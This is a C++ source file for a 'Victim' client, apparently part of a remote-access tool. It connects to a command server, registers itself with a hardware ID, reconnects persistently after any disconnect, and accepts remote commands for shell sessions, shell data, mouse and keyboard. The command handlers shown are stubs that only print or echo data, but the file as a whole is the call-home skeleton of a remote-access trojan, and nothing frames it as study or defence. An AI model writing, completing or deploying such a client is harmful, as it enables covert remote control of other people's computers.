#include "victim.hpp"
#include <thread>
#include <iostream>
#include "../commands.hpp"

Victim::Victim(std::string inHId)
	:
	myHId(inHId)
{
}

int Victim::runVictimProcess()
{
	while (!connectServer())
		sf::sleep(sf::seconds(5));

	while (true) {
		sf::Packet p;
		auto status = server.receive(p);

		if (status == sf::Socket::Status::Disconnected) {
			isSshActive = false;
			while (!connectServer())
				sf::sleep(sf::seconds(2));
		}
		if (status != sf::Socket::Status::Done)
			continue;

		uint16_t reqId = 0;
		uint8_t cmd;
		p >> reqId >> cmd;

		//start ssh session
		if (cmd == uint8_t(Cmd::START_SSH)) {
			isSshActive = true;
			std::cout << "code " << int(cmd) << ": start ssh\n";
		}
		//end ssh session
		else if (cmd == uint8_t(Cmd::END_SSH)) {
			isSshActive = false;
			std::cout << "code " << int(cmd) << ": stop ssh\n";
		}
		//receive ssh data
		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
			std::string data;
			p >> data;

			std::cout << "code " << int(cmd) << ": ssh data #" << data << "#\n";

			std::string resStr = "received and processed #" + data + "#\n";
			sf::Packet res;
			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << resStr;
			server.send(res);
		}
		//receive mouse position data
		else if (cmd == uint8_t(Cmd::SSH_MOUSE)) {
			std::cout << "code " << int(cmd) << ": mouse data\n";
		}
		//receive keyboard state data
		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD)) {
			std::cout << "code " << int(cmd) << ": keyboard data\n";
		}
		//unknown command
		else {
			std::cerr << "unknown command received: " << int(cmd) << "\n";
			continue;
		}
	}

	return 0;
}

bool Victim::connectServer()
{
	isInitialized = false;
	server.disconnect();

	//connect to the server
	if (server.connect(serverIp, serverPort) != sf::Socket::Status::Done)
		return false;

	//send the registration request
	sf::Packet req;
	uint16_t reqId = requestId++;
	req << reqId << std::uint8_t(Cmd::REGISTER_VICTIM) << myHId;
	if (server.send(req) != sf::Socket::Status::Done) {
		server.disconnect();
		return false;
	}

	sf::Packet res;
	bool waiting = true;
	//receive the initialization response
	const auto receive = [this, &waiting, &res, reqId]() {
		while (waiting) {
			res.clear();
			auto _ = server.receive(res);
			uint16_t resId;
			res >> resId;
			if (resId == reqId)
				waiting = false;
		}
	};

	std::thread receiveThread(receive);
	//wait for initialization response
	for (int i = 0; i < 10; i++) {
		sf::sleep(sf::milliseconds(500));
		if (!waiting)
			break;
	}

	if (waiting) {
		waiting = false;
		server.disconnect();
		receiveThread.join();
		return false;
	}
	receiveThread.join();

	bool success = false;
	res >> success;
	if (!success) {
		server.disconnect();
		return false;
	}

	res >> myId;
	isInitialized = true;
	return true;
}
